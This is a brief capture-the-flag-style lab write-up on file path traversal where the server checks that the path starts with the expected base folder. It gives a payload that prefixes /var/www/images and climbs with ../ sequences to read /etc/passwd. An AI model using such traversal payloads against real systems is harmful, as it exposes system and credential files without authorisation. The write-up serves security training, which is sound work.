# Lab: File path traversal, validation of start of path

## Ananlsis: Sometimes it will expect you to start at the base folder. 

/image?filename=/var/www/images

filename=/var/www/images/../../../etc/passwd

## Payload: The payload is the same as our description so this one should be easy.

image?filename=/var/www/images/../../../etc/passwd 